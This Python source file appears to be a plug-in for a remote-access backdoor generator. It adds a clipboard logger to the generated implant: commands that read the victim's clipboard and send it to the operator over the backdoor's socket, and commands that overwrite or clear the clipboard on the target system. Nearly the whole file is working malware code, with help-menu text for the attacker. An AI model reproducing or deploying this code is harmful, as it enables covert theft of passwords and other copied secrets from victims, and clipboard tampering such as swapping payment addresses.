# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyperclip')
        config.functions.append('''
def clip_logger(option):
    flag = option.split(' ',1)
    if flag[0] == 'clip_dump':
        s.sendall('[+]Got clipboard data : \\n' + pyperclip.paste())
    elif flag[0] == 'clip_set':
        pyperclip.copy(flag[1])
        s.sendall('[+]Set clipboard text to : ' + flag[1])
    elif flag[0] == 'clip_clear':
        pyperclip.copy('')
        s.sendall('[+]Cleared clipboard')''')
        config.logics.append('''
            elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                clip_logger(data)''')
        config.help_menu['clip_dump'] = 'Display contents of clipboard on the target system'
        config.help_menu['clip_set <text to set clipboard to>'] = 'Set the value of the clipboard on the target system'
        config.help_menu['clip_clear'] = 'Clear the clipboard data on the target system'
    elif option == 'info':
        print '\nName             : Clipboard logger component' \
              '\nOS               : Linux' \
              '\nRequired Modules : pyperclip (External), xclip utility for Linux (Non python external dependency)' \
              '\nCommands         : clip_set <text to set clipboard to>, clip_dump, clip_clear' \
              '\nDescription      : Allows for control over the clipboard, set, read or clear the clipboard data\n'
